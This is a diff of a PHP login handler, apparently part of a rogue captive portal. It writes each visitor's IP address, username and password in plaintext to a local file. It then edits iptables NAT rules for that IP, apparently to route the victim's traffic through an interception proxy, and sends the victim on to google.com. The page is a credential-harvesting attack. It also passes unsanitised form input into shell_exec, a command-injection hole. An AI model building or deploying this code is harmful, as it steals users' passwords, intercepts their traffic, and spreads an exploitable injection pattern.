@@ -17,7 +17,7 @@ if ($loginIsSubmitted ){
 	    shell_exec("echo ip adres '$ipadres' >> ./loginpageaccounts");
 	    shell_exec("echo username '$userName' >> ./loginpageaccounts");
         shell_exec("echo wachtwoord '$passWord' >> ./loginpageaccounts");
-        shell_exec("iptables -t nat -I PREROUTING -p tcp -s '$ipadres' --destination-port 80 -j REDIRECT --to-port 10000");
+        shell_exec("iptables -t nat -D PREROUTING -p tcp -s '$ipadres' -j DNAT --to-destination 192.168.1.1:80"); 
         ob_start();
         header('Location: http://google.com');
         ob_end_flush();
